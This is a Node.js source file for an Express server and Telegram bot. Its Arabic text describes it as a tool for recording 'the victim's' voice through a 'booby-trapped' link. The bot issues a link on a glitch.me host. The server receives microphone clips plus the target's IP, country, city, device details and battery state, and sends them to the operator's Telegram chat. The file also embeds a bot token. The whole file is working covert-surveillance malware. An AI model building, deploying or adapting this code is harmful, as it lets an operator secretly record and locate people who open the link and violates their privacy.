const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const geoip = require('geoip-lite');
const useragent = require('useragent');
const botToken = '7244359397:AAELs6eOA3t03zH7w2g2EXIaNHdXSBMOEWc'; 
const bot = new TelegramBot(botToken, { polling: true });
const app = express();

const upload = multer({ dest: 'uploads/' });

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(express.static(__dirname));

app.post('/submitVoice', upload.single('voice'), (req, res) => {
    const chatId = req.body.chatId;
    const voicePath = req.file.path;
    const additionalData = JSON.parse(req.body.additionalData);

    // إعداد النص المرافق للتسجيل الصوتي
    const caption = `
معلومات إضافية:
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
إصدار الجهاز: ${additionalData.deviceVersion}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
    `;

    bot.sendVoice(chatId, voicePath, { caption: caption }).then(() => {
        fs.unlinkSync(voicePath); 
        res.send('Voice submitted successfully!');
    }).catch(error => {
        console.error(error);
        res.status(500).send('Error sending voice message.');
    });
});

app.get('/record', (req, res) => {
    res.sendFile(path.join(__dirname, 'record.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

bot.onText(/\/sjgd/, (msg) => {
    const chatId = msg.chat.id;
    const message = 'مرحباً بك في بوت تسجيل صوت الضحيه\n المطور @SAGD112 ';
    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'حدد مدة التسجيل', callback_data: 'select_duration' }]
            ]
        }
    });
});

bot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;

    if (callbackQuery.data === 'select_duration') {
        bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
    }
});

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const duration = parseInt(msg.text, 10);

    if (!isNaN(duration)) {
        if (duration > 0 && duration <= 20) {
            const link = `https://creative-marmalade-periwinkle.glitch.me/record/${chatId}?duration=${duration}`;
            bot.sendMessage(chatId, `تم تلغيم الرابط  لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
        } else {
            bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
        }
    }
});